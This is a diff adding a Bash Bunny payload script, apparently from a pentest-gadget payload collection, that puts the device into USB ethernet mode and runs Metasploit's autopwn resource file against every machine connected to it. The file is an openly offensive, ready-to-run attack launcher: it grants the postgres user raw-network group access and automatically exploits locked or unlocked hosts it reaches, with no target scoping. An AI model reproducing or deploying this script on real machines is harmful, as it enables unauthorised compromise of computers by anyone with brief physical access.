@@ -1,0 +1,32 @@
+#!/bin/bash
+#
+# Title:         Metasploit-Autopwn
+# Author:        Mohamed A. Baset - @SymbianSyMoh - Seekurity.com
+# Version:       0.1
+#
+#
+# Runs Metasploit db_autopwn module against the whole dhcp clients conencted
+# to the Bash Bunny device exploiting locked and unlocked machines that running
+# vulnerable OSes or services.
+# Prequisities:
+# 1. Ruby 2.4.1 installed via rbenv (the best to have ruby installed without any problems)
+# 2. You must have metasploit installation up and running in path /toos/metasploit-framework/
+# 3. Copy auto_pwn.rc metasploit resources file from the payload folder to /tools/ by SSHing into your bunny
+# 4. One-time fix for adding user "postgres" to the network user groups (should be done by HAK5 folks in the first place)
+
+# Script
+# LED SETUP................Setting up stuff
+# LED ATTACK...............Running Metasploit Autopwn Module
+# LED FINISH...............Attack Finished
+
+LED SETUP
+# One-time fix for adding user "postgres" to the network user groups
+usermod -a -G netdev,systemd-network,net_raw postgres
+CUCUMBER PLAID
+ATTACKMODE RNDIS_ETHERNET
+# Please adjust a nearest date/time
+# date -s "20170830 01:23"
+LED ATTACK
+# For debugging we are writing the whole output into a file in /tools
+/root/.rbenv/shims/ruby /tools/metasploit-framework/msfconsole -r /tools/auto_pwn.rc >> /tools/msfAutopwnOUTPUT.txt
+LED FINISH
